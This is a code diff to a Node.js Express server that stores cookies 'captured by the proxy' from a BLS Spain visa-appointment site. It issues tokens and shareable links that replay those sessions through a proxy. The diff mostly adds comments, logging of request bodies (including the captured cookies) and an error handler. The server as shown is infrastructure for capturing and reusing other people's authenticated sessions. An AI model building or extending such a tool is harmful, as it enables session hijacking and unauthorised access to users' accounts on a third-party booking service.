@@ -7,10 +7,10 @@ const port = process.env.PORT || 3000; // Use port 3000 for Render
 
 // Enable CORS for specific origin
 app.use(cors({
-    origin: 'http://southafrica.blsspainglobal.com',
-    methods: ['GET', 'POST', 'OPTIONS'],
-    credentials: true,
-    allowedHeaders: ['Content-Type', 'Authorization'],
+    origin: 'http://southafrica.blsspainglobal.com', // Allow requests from this domain
+    methods: ['GET', 'POST', 'OPTIONS'], // Allow these HTTP methods
+    credentials: true, // Allow cookies and credentials
+    allowedHeaders: ['Content-Type', 'Authorization'], // Allow these headers
 }));
 
 // Middleware to parse URL-encoded and JSON data
@@ -25,6 +25,8 @@ let capturedCookies = null;
 
 // Endpoint to store cookies captured by the proxy
 app.post('/store-cookies', (req, res) => {
+    console.log('Received request at /store-cookies:', req.body); // Log the request body
+
     const { cookies } = req.body;
 
     if (!cookies) {
@@ -41,6 +43,8 @@ app.post('/store-cookies', (req, res) => {
 
 // Endpoint to generate a shareable token
 app.post('/generate-token', (req, res) => {
+    console.log('Received request at /generate-token:', req.body); // Log the request body
+
     const { url, formData } = req.body;
 
     // Validate required fields
@@ -65,11 +69,13 @@ app.post('/generate-token', (req, res) => {
     const shareableLink = `https://test-em43.onrender.com/share?token=${token}`; // Replace with your Render app URL
     console.log('Generated shareable link:', shareableLink);
 
-    res.status(200).json({ token, shareableLink });
+    res.status(200).json({ token, shareableLink }); // Send response
 });
 
 // Endpoint to retrieve session data and redirect through the proxy
 app.get('/share', (req, res) => {
+    console.log('Received request at /share:', req.query); // Log the request query
+
     const token = req.query.token;
     const sessionData = sessions[token];
 
@@ -86,7 +92,6 @@ app.get('/share', (req, res) => {
     res.redirect(proxyUrl);
 });
 
-
 // Clean up old sessions every hour
 setInterval(() => {
     const now = new Date();
@@ -99,6 +104,12 @@ setInterval(() => {
         }
     });
 }, 3600000);
+
+// Error handling middleware
+app.use((err, req, res, next) => {
+    console.error('Server error:', err);
+    res.status(500).json({ error: 'Internal server error' });
+});
 
 // Start the server
 app.listen(port, () => {
